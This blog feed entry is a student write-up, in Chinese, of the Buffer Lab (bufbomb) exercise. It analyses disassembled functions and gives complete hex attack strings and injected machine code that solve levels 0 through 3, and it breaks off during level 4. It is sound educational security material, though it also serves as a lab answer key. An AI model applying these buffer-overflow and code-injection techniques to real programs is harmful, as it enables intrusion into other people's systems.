<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Ycx&#39;Blog</title>
  
  <subtitle>今天怎么不下雨</subtitle>
  <link href="https://ycx6666.github.io/atom.xml" rel="self"/>
  
  <link href="https://ycx6666.github.io/"/>
  <updated>2024-05-18T07:39:44.285Z</updated>
  <id>https://ycx6666.github.io/</id>
  
  <author>
    <name>Ycx.Cc</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>BufLab实验</title>
    <link href="https://ycx6666.github.io/2024/06/bufferbomb/"/>
    <id>https://ycx6666.github.io/2024/06/bufferbomb/</id>
    <published>2024-06-17T13:44:57.000Z</published>
    <updated>2024-05-18T07:39:44.285Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、实验目的："><a href="#一、实验目的：" class="headerlink" title="一、实验目的："></a>一、实验目的：</h2><p>通过缓冲区溢出攻击，使学生进一步理解IA-32函数调用规则和栈帧结构。</p><h2 id="二、实验技能："><a href="#二、实验技能：" class="headerlink" title="二、实验技能："></a>二、实验技能：</h2><p>需要使用objdump来反汇编目标程序，使用gdb单步跟踪调试机器代码，查看相关内存及寄存器内容，也需要学生掌握简单的IA32汇编程序编写方法。</p><h2 id="三、实验要求："><a href="#三、实验要求：" class="headerlink" title="三、实验要求："></a>三、实验要求：</h2><p>5个难度等级（0-4逐级递增）</p><p><strong>级别0、Smoke（candle）：</strong>构造攻击字符串作为目标程序输入，造成缓冲区溢出，使目标程序能够执行smoke函数。</p><p><strong>级别1、Fizz（sparkler）：</strong>构造攻击字符串作为目标程序输入，造成缓冲区溢出，使目标程序能够执行fizz函数；fizz函数含有一个参数（cookie值），构造的攻击字符串应能给定fizz函数正确的参数，使其判断成功。</p><p><strong>级别2、Bang（firecracker）</strong>：构造攻击字符串作为目标程序输入，造成缓冲区溢出，使目标程序能够执行bang函数；并且要篡改全局变量global_value为cookie值，使其判断成功。因此，需要在缓冲区中注入恶意代码篡改全局变量。</p><p><strong>级别3、Boom（dynamite）：</strong>前面的攻击都是使目标程序跳转到特定函数，进而利用exit函数结束目标程序运行。Boom要求攻击程序能够返回到原调用函数test继续执行，即要求攻击之后，还原对栈帧结构的破坏。</p><p><strong>级别4、kaboom(Nitro)：</strong>本攻击需要对目标程序连续攻击n&#x3D;5次，但每次攻击，被攻击函数的栈帧内存地址都不同，也就是函数的栈帧位置每次运行时都不一样。因此，要想办法保证每次都能够正确复原原栈帧被破坏的状态，使程序每次都能够正确返回。</p><h2 id="四、实验内容"><a href="#四、实验内容" class="headerlink" title="四、实验内容"></a>四、实验内容</h2><h3 id="1、基于学号生成cookie"><a href="#1、基于学号生成cookie" class="headerlink" title="1、基于学号生成cookie"></a>1、基于学号生成cookie</h3><p>输入<code>./makecookie 202226010418</code><br>从而得到了对应的cookie <code>0x7fb8d860</code></p><h3 id="2、分析getbuf函数"><a href="#2、分析getbuf函数" class="headerlink" title="2、分析getbuf函数:"></a>2、分析getbuf函数:</h3><p>getbuf函数汇编代码如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">8049262:    55                          push   %ebp      // 把基址指针（ebp）推入栈中</span><br><span class="line">8049263:    89 e5                       mov    %esp,%ebp // 把当前栈顶（esp）设定为新的基址</span><br><span class="line">8049265:    83 ec 38                    sub    $0x38,%esp // 在栈上分配38h (56) 字节的空间</span><br><span class="line">8049268:    8d 45 d8                    lea    -0x28(%ebp),%eax // 加载ebp - 28h的地址到eax，这是输入buffer的地址</span><br><span class="line">804926b:    89 04 24                    mov    %eax,(%esp) // 把输入buffer的地址压入栈顶，作为参数给Gets函数</span><br><span class="line">804926e:    e8 bf f9 ff ff              call   8048c32 &lt;Gets&gt; // 调用Gets函数，读取输入到buffer</span><br><span class="line">8049273:    b8 01 00 00 00              mov    $0x1,%eax // 把立即数1移动到eax，这将作为函数getbuf的返回值</span><br><span class="line">8049278:    c9                          leave   // 把ebp值移动到esp并弹出ebp，完成栈的回收</span><br><span class="line">8049279:    c3                          ret   // 返回上级调用者</span><br><span class="line">804927a:  90                   nop //这些多余的&#x27;90&#x27;s是nop命令，意味着“无操作” </span><br><span class="line">804927b:90                   nop</span><br><span class="line">804927c:90                   nop</span><br><span class="line">804927d:90                   nop</span><br><span class="line">804927e:90                   nop</span><br><span class="line">804927f:90                   nop</span><br></pre></td></tr></table></figure><h3 id="3、分析getbufn函数："><a href="#3、分析getbufn函数：" class="headerlink" title="3、分析getbufn函数："></a>3、分析getbufn函数：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">8049244:55                      push   %ebp               // 保存基址指针寄存器的值</span><br><span class="line">8049245:89 e5                   mov    %esp,%ebp          // 把栈指针寄存器的值复制给基址指针寄存器</span><br><span class="line">8049247:81 ec 18 02 00 00       sub    $0x218,%esp        // 从栈指针寄存器的值中减去0x218，为局部变量分配内存</span><br><span class="line">804924d:8d 85 f8 fd ff ff       lea    -0x208(%ebp),%eax  // 把ebp-0x208的地址加载到eax里，这将作为Gets函数的参数</span><br><span class="line">8049253:89 04 24                mov    %eax,(%esp)        // 把eax的值存入栈顶，这将作为Gets函数的参数</span><br><span class="line">8049256:e8 d7 f9 ff ff          call   8048c32 &lt;Gets&gt;     // 调用Gets函数，它将读取输入并填充到函数栈帧的指定位置</span><br><span class="line">804925b:b8 01 00 00 00          mov    $0x1,%eax          // 把1加载到eax中，这将作为函数的返回值</span><br><span class="line">8049260:c9                      leave                     // 把ebp的值赋给esp，然后弹出ebp，清空函数栈帧</span><br><span class="line">8049261:c3                      ret                       // 返回到调用者</span><br></pre></td></tr></table></figure><p>getbuf函数在test函数中被调用，test汇编如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">08048e3c &lt;test&gt;:</span><br><span class="line"> 8048e3c:55                   push   %ebp</span><br><span class="line"> 8048e3d:89 e5                mov    %esp,%ebp</span><br><span class="line"> 8048e3f:53                   push   %ebx</span><br><span class="line"> 8048e40:83 ec 24             sub    $0x24,%esp</span><br><span class="line"> 8048e43:e8 d0 fd ff ff       call   8048c18 &lt;uniqueval&gt;</span><br><span class="line"> 8048e48:89 45 f4             mov    %eax,-0xc(%ebp)</span><br><span class="line"> 8048e4b:e8 12 04 00 00       call   8049262 &lt;getbuf&gt;</span><br><span class="line"> 8048e50:89 c3                mov    %eax,%ebx</span><br><span class="line"> 8048e52:e8 c1 fd ff ff       call   8048c18 &lt;uniqueval&gt;</span><br><span class="line"> 8048e57:8b 55 f4             mov    -0xc(%ebp),%edx</span><br><span class="line"> 8048e5a:39 d0                cmp    %edx,%eax</span><br><span class="line"> 8048e5c:74 16                je     8048e74 &lt;test+0x38&gt;</span><br><span class="line"> 8048e5e:c7 44 24 04 60 a4 04 movl   $0x804a460,0x4(%esp)</span><br><span class="line"> 8048e65:08 </span><br><span class="line"> 8048e66:c7 04 24 01 00 00 00 movl   $0x1,(%esp)</span><br><span class="line"> 8048e6d:e8 1e fb ff ff       call   8048990 &lt;__printf_chk@plt&gt;</span><br><span class="line"> 8048e72:eb 46                jmp    8048eba &lt;test+0x7e&gt;</span><br><span class="line"> 8048e74:3b 1d 04 d1 04 08    cmp    0x804d104,%ebx</span><br><span class="line"> 8048e7a:75 26                jne    8048ea2 &lt;test+0x66&gt;</span><br><span class="line"> 8048e7c:89 5c 24 08          mov    %ebx,0x8(%esp)</span><br><span class="line"> 8048e80:c7 44 24 04 1a a3 04 movl   $0x804a31a,0x4(%esp)</span><br><span class="line"> 8048e87:08 </span><br><span class="line"> 8048e88:c7 04 24 01 00 00 00 movl   $0x1,(%esp)</span><br><span class="line"> 8048e8f:e8 fc fa ff ff       call   8048990 &lt;__printf_chk@plt&gt;</span><br><span class="line"> 8048e94:c7 04 24 03 00 00 00 movl   $0x3,(%esp)</span><br><span class="line"> 8048e9b:e8 e0 03 00 00       call   8049280 &lt;validate&gt;</span><br><span class="line"> 8048ea0:eb 18                jmp    8048eba &lt;test+0x7e&gt;</span><br><span class="line"> 8048ea2:89 5c 24 08          mov    %ebx,0x8(%esp)</span><br><span class="line"> 8048ea6:c7 44 24 04 37 a3 04 movl   $0x804a337,0x4(%esp)</span><br><span class="line"> 8048ead:08 </span><br><span class="line"> 8048eae:c7 04 24 01 00 00 00 movl   $0x1,(%esp)</span><br><span class="line"> 8048eb5:e8 d6 fa ff ff       call   8048990 &lt;__printf_chk@plt&gt;</span><br><span class="line"> 8048eba:83 c4 24             add    $0x24,%esp</span><br><span class="line"> 8048ebd:5b                   pop    %ebx</span><br><span class="line"> 8048ebe:5d                   pop    %ebp</span><br><span class="line"> 8048ebf:c3                   ret    </span><br></pre></td></tr></table></figure><p>可以画出test和getfuf原始的栈图:</p><img src="../images/bufferbomb/image-20240515172448203.png" alt="image-20240515172448203" style="zoom:50%;"><h3 id="4、Level-0"><a href="#4、Level-0" class="headerlink" title="4、Level 0"></a>4、Level 0</h3><p>构造攻击字符串作为目标程序输入，造成缓冲区溢出，使目标程序能够执行smoke函数。</p><p>smoke函数的汇编代码如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">08048e0a &lt;smoke&gt;:</span><br><span class="line"> 8048e0a:55                   push   %ebp</span><br><span class="line"> 8048e0b:89 e5                mov    %esp,%ebp</span><br><span class="line"> 8048e0d:83 ec 18             sub    $0x18,%esp</span><br><span class="line"> 8048e10:c7 44 24 04 fe a2 04 movl   $0x804a2fe,0x4(%esp)</span><br><span class="line"> 8048e17:08 </span><br><span class="line"> 8048e18:c7 04 24 01 00 00 00 movl   $0x1,(%esp)</span><br><span class="line"> 8048e1f:e8 6c fb ff ff       call   8048990 &lt;__printf_chk@plt&gt;</span><br><span class="line"> 8048e24:c7 04 24 00 00 00 00 movl   $0x0,(%esp)</span><br><span class="line"> 8048e2b:e8 50 04 00 00       call   8049280 &lt;validate&gt;</span><br><span class="line"> 8048e30:c7 04 24 00 00 00 00 movl   $0x0,(%esp)</span><br><span class="line"> 8048e37:e8 94 fa ff ff       call   80488d0 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure><p>可以看到smoke的函数地址为<code>08048e0a</code></p><p>原始栈：<img src="../images/bufferbomb/image-20240515172357887.png" alt="image-20240515172357887" style="zoom:50%;"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">8049268:8d 45 d8             lea    -0x28(%ebp),%eax</span><br><span class="line">804926b:89 04 24             mov    %eax,(%esp)</span><br><span class="line">804926e:e8 bf f9 ff ff       call   8048c32 &lt;Gets&gt;</span><br></pre></td></tr></table></figure><p>根据这里可以得到Gets所能调动的栈大小为0x28个字节大小</p><p>那么只需要在返回地址区放入返回地址，就能在输入buffer之后返回到smoke函数，那么只需要把buffer内容控制到刚好覆盖test返回区</p><p>由于在这里Gets函数所能存储的输入buf的区域只有0x28个字节，那么就需要输入的字节大小就为:<br>$$<br>buf(0x28)+ebp(0x4)+return area(0x4)&#x3D;48<br>$$<br>个字节大小，并且最后四个字节存放smoke的首地址<code>08048e0a</code>即可</p><p>由于是小端法存储，这个数据可以是:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 0a 8e 04 08</span><br></pre></td></tr></table></figure><p>输入<code>cat level0.txt |./hex2raw |./bufbomb -u 202226010418</code></p><p>然而显示错误，尝试将0a加1延长函数运行，即改为0b，发现成功</p><p><img src="/../images/bufferbomb/image-20240515212026806.png" alt="image-20240515212026806"></p><h3 id="5、level-1"><a href="#5、level-1" class="headerlink" title="5、level 1"></a>5、level 1</h3><p><strong>级别1、Fizz（sparkler）：</strong>构造攻击字符串作为目标程序输入，造成缓冲区溢出，使目标程序能够执行fizz函数；fizz函数含有一个参数（cookie值），构造的攻击字符串应能给定fizz函数正确的参数，使其判断成功。</p><p>fizz函数汇编代码如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">08048daf &lt;fizz&gt;:</span><br><span class="line"> 8048daf:55                   push   %ebp</span><br><span class="line"> 8048db0:89 e5                mov    %esp,%ebp</span><br><span class="line"> 8048db2:83 ec 18             sub    $0x18,%esp</span><br><span class="line"> 8048db5:8b 45 08             mov    0x8(%ebp),%eax</span><br><span class="line"> 8048db8:3b 05 04 d1 04 08    cmp    0x804d104,%eax</span><br><span class="line"> 8048dbe:75 26                jne    8048de6 &lt;fizz+0x37&gt;</span><br><span class="line"> 8048dc0:89 44 24 08          mov    %eax,0x8(%esp)</span><br><span class="line"> 8048dc4:c7 44 24 04 e0 a2 04 movl   $0x804a2e0,0x4(%esp)</span><br><span class="line"> 8048dcb:08 </span><br><span class="line"> 8048dcc:c7 04 24 01 00 00 00 movl   $0x1,(%esp)</span><br><span class="line"> 8048dd3:e8 b8 fb ff ff       call   8048990 &lt;__printf_chk@plt&gt;</span><br><span class="line"> 8048dd8:c7 04 24 01 00 00 00 movl   $0x1,(%esp)</span><br><span class="line"> 8048ddf:e8 9c 04 00 00       call   8049280 &lt;validate&gt;</span><br><span class="line"> 8048de4:eb 18                jmp    8048dfe &lt;fizz+0x4f&gt;</span><br><span class="line"> 8048de6:89 44 24 08          mov    %eax,0x8(%esp)</span><br><span class="line"> 8048dea:c7 44 24 04 d4 a4 04 movl   $0x804a4d4,0x4(%esp)</span><br><span class="line"> 8048df1:08 </span><br><span class="line"> 8048df2:c7 04 24 01 00 00 00 movl   $0x1,(%esp)</span><br><span class="line"> 8048df9:e8 92 fb ff ff       call   8048990 &lt;__printf_chk@plt&gt;</span><br><span class="line"> 8048dfe:c7 04 24 00 00 00 00 movl   $0x0,(%esp)</span><br><span class="line"> 8048e05:e8 c6 fa ff ff       call   80488d0 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure><p>这个fizz函数的首地址为<code>08048daf</code>，可以通过仿照level 0的方法来实现，但是这里除了要将返回地址改为<code>08048daf</code>，还需要像参数区压入一个cookie值<code>0x7fb8d860</code></p><p>可以得到这样的栈帧:</p><p><img src="/../images/bufferbomb/image-20240515213756545.png" alt="image-20240515213756545"></p><p>同样由于在这里Gets函数所能存储的输入buf的区域只有0x28个字节，那么就需要输入的字节大小就为:<br>$$<br>buf(0x28)+ebp(0x4)+return area(0x4)&#x3D;48<br>$$<br>然后需要像fizz函数的返回地址中填入值再达到fizz的参数区，向其中填入Cookie值</p><p>那么这个txt文件就应该为:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 af 8d 04 08 </span><br><span class="line">00 00 00 00 60 d8 b8 7f</span><br></pre></td></tr></table></figure><p>输入<code>cat level1.txt |./hex2raw |./bufbomb -u 202226010418</code></p><p>运行成功:</p><p><img src="/../images/bufferbomb/image-20240515214042198.png" alt="image-20240515214042198"></p><h3 id="6、level-2"><a href="#6、level-2" class="headerlink" title="6、level 2"></a>6、level 2</h3><p><strong>级别2、Bang（firecracker）</strong>：构造攻击字符串作为目标程序输入，造成缓冲区溢出，使目标程序能够执行bang函数；并且要篡改全局变量global_value为cookie值，使其判断成功。因此，需要在缓冲区中注入恶意代码篡改全局变量。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">08048d52 &lt;bang&gt;:</span><br><span class="line"> 8048d52:55                   push   %ebp</span><br><span class="line"> 8048d53:89 e5                mov    %esp,%ebp</span><br><span class="line"> 8048d55:83 ec 18             sub    $0x18,%esp</span><br><span class="line"> 8048d58:a1 0c d1 04 08       mov    0x804d10c,%eax</span><br><span class="line"> 8048d5d:3b 05 04 d1 04 08    cmp    0x804d104,%eax</span><br><span class="line"> 8048d63:75 26                jne    8048d8b &lt;bang+0x39&gt;</span><br><span class="line"> 8048d65:89 44 24 08          mov    %eax,0x8(%esp)</span><br><span class="line"> 8048d69:c7 44 24 04 ac a4 04 movl   $0x804a4ac,0x4(%esp)</span><br><span class="line"> 8048d70:08 </span><br><span class="line"> 8048d71:c7 04 24 01 00 00 00 movl   $0x1,(%esp)</span><br><span class="line"> 8048d78:e8 13 fc ff ff       call   8048990 &lt;__printf_chk@plt&gt;</span><br><span class="line"> 8048d7d:c7 04 24 02 00 00 00 movl   $0x2,(%esp)</span><br><span class="line"> 8048d84:e8 f7 04 00 00       call   8049280 &lt;validate&gt;</span><br><span class="line"> 8048d89:eb 18                jmp    8048da3 &lt;bang+0x51&gt;</span><br><span class="line"> 8048d8b:89 44 24 08          mov    %eax,0x8(%esp)</span><br><span class="line"> 8048d8f:c7 44 24 04 c2 a2 04 movl   $0x804a2c2,0x4(%esp)</span><br><span class="line"> 8048d96:08 </span><br><span class="line"> 8048d97:c7 04 24 01 00 00 00 movl   $0x1,(%esp)</span><br><span class="line"> 8048d9e:e8 ed fb ff ff       call   8048990 &lt;__printf_chk@plt&gt;</span><br><span class="line"> 8048da3:c7 04 24 00 00 00 00 movl   $0x0,(%esp)</span><br><span class="line"> 8048daa:e8 21 fb ff ff       call   80488d0 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure><p>需要先找到全局变量global_value,通过查阅bang汇编代码，可以发现有两个地址:</p><p><code>0x804d10c</code>和<code> 0x804d104</code>，通过gdb查看哪一个地址对应了cookie值，哪一个对应了value值:</p><p><img src="/../images/bufferbomb/image-20240515215147724.png" alt="image-20240515215147724"></p><p>那么<code>0x804d10c</code>就对应了value值 </p><p>   <code> 0x804d104</code>就对应了cookie值</p><p>可以尝试编写一段汇编代码，来达到修改cookie的值:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movl $0x7fb8d860,0x804d10c //把cookie值赋给value</span><br><span class="line">push $0x8048d52 //把bang返回地址压栈</span><br><span class="line">ret </span><br></pre></td></tr></table></figure><p>将这段汇编代码转化为二进制代码:</p><p><img src="/../images/bufferbomb/image-20240515222402877.png" alt="image-20240515222402877"></p><p>最后需要将这段机器码放入buf区中，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">8049265:    83 ec 38                    sub    $0x38,%esp // 在栈上分配38h (56) 字节的空间</span><br><span class="line">8049268:    8d 45 d8                    lea    -0x28(%ebp),%eax // 加载ebp - 28h的地址到eax，这是输入buffer的地址</span><br><span class="line">804926b:    89 04 24                    mov    %eax,(%esp) // 把输入buffer的地址压入栈顶，作为参数给Gets函数</span><br><span class="line">804926e:    e8 bf f9 ff ff              call   8048c32 &lt;Gets&gt; // 调用Gets函数，读取输入到buffer</span><br></pre></td></tr></table></figure><p>buf的首地址为:ebp-28，用gdb查看ebp-28也就是eax对应的地址:</p><p><img src="/../images/bufferbomb/image-20240515221234957.png" alt="image-20240515221234957"></p><p>那么对应的txt文本就如下:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">c7 05 0c d1 04 08 60 </span><br><span class="line">d8 b8 7f </span><br><span class="line">68 52 8d 04 08       </span><br><span class="line">c3                         </span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">08 2f 68 55</span><br></pre></td></tr></table></figure><p>运行<code>cat level2_handler.txt |./hex2raw |./bufbomb -u 202226010418</code>后如下:</p><p><img src="/../images/bufferbomb/image-20240515222549094.png" alt="image-20240515222549094"></p><p>运行成功</p><h3 id="7、level-3"><a href="#7、level-3" class="headerlink" title="7、level 3"></a>7、level 3</h3><p><strong>级别3、Boom（dynamite）：</strong>前面的攻击都是使目标程序跳转到特定函数，进而利用exit函数结束目标程序运行。Boom要求攻击程序能够返回到原调用函数test继续执行，即要求攻击之后，还原对栈帧结构的破坏。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">8048e43:e8 d0 fd ff ff       call   8048c18 &lt;uniqueval&gt;</span><br><span class="line">8048e48:89 45 f4             mov    %eax,-0xc(%ebp)</span><br><span class="line">8048e4b:e8 12 04 00 00       call   8049262 &lt;getbuf&gt;</span><br><span class="line">8048e50:89 c3                mov    %eax,%ebx</span><br></pre></td></tr></table></figure><p>这里同level2，但是由于要继续运行，因此需要将<code>call 8049262 &lt;getbuf&gt;</code>的下一行地址压栈,那么就能得到如下攻击程序</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movl $0x7fb8d860,%eax //把cookie值存入返回值eax</span><br><span class="line">push $0x8048e50 //把call的下一行地址压栈</span><br><span class="line">ret </span><br></pre></td></tr></table></figure><p>将其转换为机器码:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">b8 60 d8 b8 7f      </span><br><span class="line">68 50 8e 04 08       </span><br><span class="line">c3                  </span><br></pre></td></tr></table></figure><p>接下来需要将旧的ebp值恢复,利用gdb调试getbuf，然后查看ebp的值:</p><p><img src="/../images/bufferbomb/image-20240515224821753.png" alt="image-20240515224821753"></p><p>那么就能得到最后的攻击程序文本</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">b8 60 d8 b8 7f      </span><br><span class="line">68 50 8e 04 08       </span><br><span class="line">c3                                     </span><br><span class="line">00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 00</span><br><span class="line">60 2f 68 55  //覆盖为old ebp的值</span><br><span class="line">08 2f 68 55 //返回地址指向call getbuf()的下一跳地址</span><br></pre></td></tr></table></figure><p>运行<code>cat level3_handler.txt |./hex2raw |./bufbomb -u 202226010418</code>后如下:</p><p><img src="/../images/bufferbomb/image-20240515230406545.png" alt="image-20240515230406545"></p><p>运行成功</p><h3 id="8、level-4"><a href="#8、level-4" class="headerlink" title="8、level 4"></a>8、level 4</h3><p><strong>级别4、kaboom(Nitro)：</strong>本攻击需要对目标程序连续攻击n&#x3D;5次，但每次攻击，被攻击函数的栈帧内存地址都不同，也就是函数的栈帧位置每次运行时都不一样。因此，要想办法保证每次都能够正确复原原栈帧被破坏的状态，使程序每次都能够正确返回。同时将cookie作为返回值返回给testn。</p><p>getbufn函数汇编：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">8049244:55                      push   %ebp               // 保存基址指针寄存器的值</span><br><span class="line">8049245:89 e5                   mov    %esp,%ebp          // 把栈指针寄存器的值复制给基址指针寄存器</span><br><span class="line">8049247:81 ec 18 02 00 00       sub    $0x218,%esp        // 从栈指针寄存器的值中减去0x218，为局部变量分配内存</span><br><span class="line">804924d:8d 85 f8 fd ff ff       lea    -0x208(%ebp),%eax  // 把ebp-0x208的地址加载到eax里，这将作为Gets函数的参数</span><br><span class="line">8049253:89 04 24                mov    %eax,(%esp)        // 把eax的值存入栈顶，这将作为Gets函数的参数</span><br><span class="line">8049256:e8 d7 f9 ff ff          call   8048c32 &lt;Gets&gt;     // 调用Gets函数，它将读取输入并填充到函数栈帧的指定位置</span><br><span class="line">804925b:b8 01 00 00 00          mov    $0x1,%eax          // 把1加载到eax中，这将作为函数的返回值</span><br><span class="line">8049260:c9                      leave                     // 把ebp的值赋给esp，然后弹出ebp，清空函数栈帧</span><br><span class="line">8049261:c3                      ret                       // 返回到调用者</span><br></pre></td></tr></table></figure><p>可以看到getbufn将栈区扩大到了0x218,并且Gets函数输入的buf也扩大到了0x208</p><p>testn函数汇编:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">08048cce &lt;testn&gt;:</span><br><span class="line"> 8048cce:55                   push   %ebp</span><br><span class="line"> 8048ccf:89 e5                mov    %esp,%ebp</span><br><span class="line"> 8048cd1:53                   push   %ebx</span><br><span class="line"> 8048cd2:83 ec 24             sub    $0x24,%esp</span><br><span class="line"> 8048cd5:e8 3e ff ff ff       call   8048c18 &lt;uniqueval&gt;</span><br><span class="line"> 8048cda:89 45 f4             mov    %eax,-0xc(%ebp)</span><br><span class="line"> 8048cdd:e8 62 05 00 00       call   8049244 &lt;getbufn&gt;</span><br><span class="line"> 8048ce2:89 c3                mov    %eax,%ebx</span><br><span class="line"> 8048ce4:e8 2f ff ff ff       call   8048c18 &lt;uniqueval&gt;</span><br><span class="line"> 8048ce9:8b 55 f4             mov    -0xc(%ebp),%edx</span><br><span class="line"> 8048cec:39 d0                cmp    %edx,%eax</span><br><span class="line"> 8048cee:74 16                je     8048d06 